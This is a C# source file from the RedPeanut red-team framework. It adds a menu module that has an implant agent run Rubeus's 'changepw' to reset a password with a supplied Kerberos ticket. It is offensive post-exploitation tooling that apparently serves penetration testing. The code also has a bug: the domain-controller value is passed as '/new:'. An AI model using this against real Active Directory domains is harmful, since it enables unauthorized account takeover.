//
// Author: B4rtik (@b4rtik)
// Project: RedPeanut (https://github.com/b4rtik/RedPeanut)
// License: BSD 3-Clause
//

using System;
using System.Collections.Generic;
using System.Linq;
using static RedPeanut.Utility;

namespace RedPeanut
{
    class RubeusChangePwManager : IMenu
    {
        public static Dictionary<string, string> mainmenu = new Dictionary<string, string>
        {
            { "set ticket", "Set kirbi file or base64 rep" },
            { "set new", "Set new password" },
            { "set dc", "Set set domain controller" },
            { "run", "Execute module" },
            { "options", "Print current config" },
            { "info", "Print help" },
            { "back", "Back to lateral menu" }
        };

        IAgentInstance agent = null;
        string modulename = "changepw";
        string ticket;
        string newpassword;
        string dc;

        public RubeusChangePwManager()
        {

        }

        public RubeusChangePwManager(IAgentInstance agent)
        {
            this.agent = agent;
        }

        public void Execute()
        {
            string input;
            SetAutoCompletionHandler(mainmenu);
            do
            {
                input = RedPeanutCLI(agent, modulename);
                RubeusDumpMenu(input);
            } while (input != "back");
        }

        private void RubeusDumpMenu(string input)
        {
            string[] a_input = input.Split(' ');
            string f_input = ParseSelection(input);

            if (!string.IsNullOrEmpty(input))
            {
                if (mainmenu.ContainsKey(f_input.TrimEnd()))
                {
                    switch (f_input.TrimEnd())
                    {
                        case "set ticket":
                            ticket = GetParsedSetString(input);
                            break;
                        case "set new":
                            newpassword = GetParsedSetString(input);
                            break;
                        case "set dc":
                            dc = GetParsedSetString(input);
                            break;
                        case "run":
                            Run();
                            break;
                        case "options":
                            PrintCurrentConfig();
                            break;
                        case "info":
                            PrintOptions("info", mainmenu);
                            break;
                        case "back":
                            Program.GetMenuStack().Pop();
                            return;
                        default:
                            Console.WriteLine("We had a woodoo");
                            break;
                    }
                }
                else
                {
                    PrintOptions("Command not found", mainmenu);
                }
            }
        }
        
        private void Run()
        {
            List<string> args = new List<string>();
            args.Add("changepw");

            if (!string.IsNullOrEmpty(ticket))
            {
                args.Add("/ticket:" + ticket);
            }

            if (!string.IsNullOrEmpty(newpassword))
            {
                args.Add("/new:" + newpassword);
            }

            if (!string.IsNullOrEmpty(dc))
            {
                args.Add("/new:" + dc);
            }

            RunAssembly(PL_MODULE_RUBEUS, "Rubeus.Program", args.ToArray<string>(), agent);

        }
        

        private void PrintCurrentConfig()
        {
            Dictionary<string, string> properties = new Dictionary<string, string>
            {
                { "ticket", ticket },
                { "new", newpassword },
                { "dc", dc }
            };

            Utility.PrintCurrentConfig(modulename, properties);
        }
    }
}

